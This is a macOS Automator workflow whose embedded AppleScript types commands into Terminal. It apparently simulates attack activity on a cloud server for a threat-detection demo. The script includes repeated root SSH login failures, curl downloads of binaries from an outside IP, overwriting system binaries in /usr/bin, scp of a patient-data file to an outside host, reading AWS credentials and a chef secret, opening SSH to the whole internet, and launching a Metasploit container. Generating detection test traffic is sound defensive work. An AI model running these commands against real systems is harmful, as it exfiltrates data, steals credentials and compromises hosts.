<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
	<key>AMApplicationBuild</key>
	<string>428</string>
	<key>AMApplicationVersion</key>
	<string>2.7</string>
	<key>AMDocumentVersion</key>
	<string>2</string>
	<key>actions</key>
	<array>
		<dict>
			<key>action</key>
			<dict>
				<key>AMAccepts</key>
				<dict>
					<key>Container</key>
					<string>List</string>
					<key>Optional</key>
					<true/>
					<key>Types</key>
					<array>
						<string>com.apple.applescript.object</string>
					</array>
				</dict>
				<key>AMActionVersion</key>
				<string>1.0.2</string>
				<key>AMApplication</key>
				<array>
					<string>Automator</string>
				</array>
				<key>AMParameterProperties</key>
				<dict>
					<key>source</key>
					<dict/>
				</dict>
				<key>AMProvides</key>
				<dict>
					<key>Container</key>
					<string>List</string>
					<key>Types</key>
					<array>
						<string>com.apple.applescript.object</string>
					</array>
				</dict>
				<key>ActionBundlePath</key>
				<string>/System/Library/Automator/Run AppleScript.action</string>
				<key>ActionName</key>
				<string>Run AppleScript</string>
				<key>ActionParameters</key>
				<dict>
					<key>source</key>
					<string>tell application "Terminal"	reopen	activate		-- External Attacks		-- 5 Login Failures	do script "ssh -i ~/seteam.pem root@52.91.43.21" in window 1	delay 2	tell application "System Events" to keystroke "c" using {control down}		do script "ssh -i ~/seteam.pem root@52.91.43.21" in window 1	delay 2	tell application "System Events" to keystroke "c" using {control down}		do script "ssh -i ~/seteam.pem root@52.91.43.21" in window 1	delay 2	tell application "System Events" to keystroke "c" using {control down}		do script "ssh -i ~/seteam.pem root@52.91.43.21" in window 1	delay 2	tell application "System Events" to keystroke "c" using {control down}		do script "ssh -i ~/seteam.pem root@52.91.43.21" in window 1	tell application "System Events" to keystroke "c" using {control down}		delay 3		do script "ssh -i ~/seteam.pem ubuntu@52.91.43.21" in window 1	delay 2	tell application "System Events" to keystroke return	-- ssh		do script "curl https://183.3.202.101/binaries.tgz ." in window 1		tell application "System Events" to keystroke return		do script "sudo cp /tmp/lsof /usr/bin" in window 1	tell application "System Events" to keystroke return	do script "sudo cp /tmp/lsof /usr/bin" in window 1	tell application "System Events" to keystroke return	do script "sudo cp /tmp/bash /usr/bin" in window 1	tell application "System Events" to keystroke return	-- Command and control		do script "ping -c 1 183.3.202.101" in window 1		delay 2		tell application "System Events" to keystroke "c" using {control down}		-- Action on objectives		do script "scp -o ConnectTimeout=3 patientdata.txt 34.3.2.4:/tmp" in window 1		delay 2		tell application "System Events" to keystroke "c" using {control down}			-- Stole keys	do script "cat /home/ubuntu/.aws/credentials" in window 1		do script "cat /etc/chef/encrypted_data_bag_secret" in window 1		delay 2	tell application "System Events" to keystroke "c" using {control down}			-- delay 5	-- tell application "System Events" to key code 41 using {shift down}	-- delay 2	-- tell application "System Events" to keystroke "q"	-- delay 2	-- tell application "System Events" to key code 36				-- Risky behavior 		-- Install insecure software		do script "sudo apt-get remove --assume-yes htop" in window 1	delay 3	tell application "System Events" to keystroke return			do script "sudo apt-get install --assume-yes htop" in window 1	delay 4	tell application "System Events" to keystroke return		do script "sudo apt-get remove --assume-yes bzip2" in window 1	delay 3	tell application "System Events" to keystroke return			do script "sudo apt-get install --assume-yes bzip2" in window 1	delay 4	tell application "System Events" to keystroke return			do script "sudo hping3 localhost -p 21 -c 5" in window 1		delay 2		tell application "System Events" to keystroke "c" using {control down}			-- Attach EC2	do script "aws iam  attach-user-policy --user-name threatsnacks --policy-arn arn:aws:iam::aws:policy/AmazonEC2ReadOnlyAccess" in window 1				-- run visudo	do script "sudo visudo" in window 1	delay 5	tell application "System Events" to key code 20 using {shift down}	delay 3	tell application "System Events" to keystroke "x" using {control down}	tell application "System Events" to keystroke "y"		tell application "System Events"		tell application process "Terminal"			set frontmost to true			key code 41 using {control down}			keystroke return		end tell	end tell	delay 5			-- run tcpdump for 50 packets	do script "sudo tcpdump -c 50" in window 1	delay 5		-- create a directory, chown it, delete it	do script "sudo mkdir test; sudo chown 777 test; sudo rmdir test" in window 1	delay 5		-- run wget to download a file	do script "wget -O /dev/null http://speedtest.wdc01.softlayer.com/downloads/test10.zip" in window 1	delay 4	tell application "System Events" to keystroke "c" using {control down}		do script "aws iam put-role-policy  --policy-name AmazonS3FullAccess --role-name tsplanning --policy-document file://policy.json" in window 1	do script "aws s3api put-bucket-policy --bucket tsdemotest  --policy file://bucketpolicy.json" in window 1	do script "aws ec2 create-security-group --group-name \"tsdemotest\" --description \"tsdemotest\"" in window 1	do script "aws ec2 authorize-security-group-ingress --group-name \"tsdemotest\" --cidr \"0.0.0.0/0\" --port 22 --protocol tcp" in window 1		do script "aws ec2 delete-security-group --group-name \"tsdemotest\"" in window 1					-- connect to know bad IP		do script "ping -c 1 120.24.251.143" in window 1	delay 2			tell application "System Events"		tell application process "Terminal"			set frontmost to true			key code 8 using {control down}		end tell	end tell		delay 5		do script "sudo docker run --rm -it linuxkonsult/kali-metasploit /bin/bash" in window 1	delay 4			do script "ping -c 1 183.3.202.101" in window 1		delay 5		tell application "System Events" to keystroke "c" using {control down}		do script "exit" in window 1			do script "sudo userdel alternate" in window 1	tell application "System Events" to keystroke return		delay 2		do script "sudo useradd alternate" in window 1	tell application "System Events" to keystroke return		delay 2		do script "sudo su alternate" in window 1	tell application "System Events" to keystroke return	delay 2		do script "curl https://183.3.202.101/binaries.tgz ." in window 1	tell application "System Events" to keystroke return	tell application "System Events" to keystroke "c" using {control down}	delay 2		do script "exit" in window 1	delay 2	do script "sudo userdel alternate" in window 1	tell application "System Events" to keystroke return	delay 2			do script "sudo userdel phil" in window 1	tell application "System Events" to keystroke return	delay 2	do script "sudo useradd phil" in window 1	tell application "System Events" to keystroke return	delay 2	do script "sudo su phil" in window 1	tell application "System Events" to keystroke return	delay 2	do script "curl https://183.3.202.101/binaries.tgz ." in window 1	delay 2	tell application "System Events" to keystroke "c" using {control down}	do script "exit" in window 1	delay 2	do script "sudo userdel phil" in window 1	delay 2		do script "sudo userdel venkat" in window 1	tell application "System Events" to keystroke return	delay 2	do script "sudo useradd venkat" in window 1	tell application "System Events" to keystroke return	delay 2	do script "sudo su venkat" in window 1	delay 2	do script "curl https://183.3.202.101/binaries.tgz ." in window 1	tell application "System Events" to keystroke "c" using {control down}	delay 2	do script "exit" in window 1	delay 2	do script "sudo userdel venkat" in window 1		delay 2		do script "sudo userdel vikram" in window 1	tell application "System Events" to keystroke return	delay 2	do script "sudo useradd vikram" in window 1	tell application "System Events" to keystroke return	delay 2	do script "sudo su vikram" in window 1	tell application "System Events" to keystroke return	delay 2	do script "curl https://183.3.202.101/binaries.tgz ." in window 1	tell application "System Events" to keystroke "c" using {control down}	delay 2	do script "exit" in window 1	delay 2	do script "sudo userdel vikram" in window 1	delay 2	end tell</string>
				</dict>
				<key>BundleIdentifier</key>
				<string>com.apple.Automator.RunScript</string>
				<key>CFBundleVersion</key>
				<string>1.0.2</string>
				<key>CanShowSelectedItemsWhenRun</key>
				<false/>
				<key>CanShowWhenRun</key>
				<true/>
				<key>Category</key>
				<array>
					<string>AMCategoryUtilities</string>
				</array>
				<key>Class Name</key>
				<string>RunScriptAction</string>
				<key>InputUUID</key>
				<string>E25C2431-FD7D-4637-BF9D-605136292301</string>
				<key>Keywords</key>
				<array>
					<string>Run</string>
				</array>
				<key>OutputUUID</key>
				<string>F9347339-2542-424D-B93A-7D4990BB3F90</string>
				<key>UUID</key>
				<string>298FC44A-9F7C-440C-8000-0F7D65CA348E</string>
				<key>UnlocalizedApplications</key>
				<array>
					<string>Automator</string>
				</array>
				<key>arguments</key>
				<dict>
					<key>0</key>
					<dict>
						<key>default value</key>
						<string>on run {input, parameters}
	
	(* Your script goes here *)
	
	return input
end run</string>
						<key>name</key>
						<string>source</string>
						<key>required</key>
						<string>0</string>
						<key>type</key>
						<string>0</string>
						<key>uuid</key>
						<string>0</string>
					</dict>
				</dict>
				<key>isViewVisible</key>
				<true/>
				<key>location</key>
				<string>489.000000:594.000000</string>
				<key>nibPath</key>
				<string>/System/Library/Automator/Run AppleScript.action/Contents/Resources/Base.lproj/main.nib</string>
			</dict>
			<key>isViewVisible</key>
			<true/>
		</dict>
	</array>
	<key>connectors</key>
	<dict/>
	<key>workflowMetaData</key>
	<dict>
		<key>workflowTypeIdentifier</key>
		<string>com.apple.Automator.application</string>
	</dict>
</dict>
</plist>
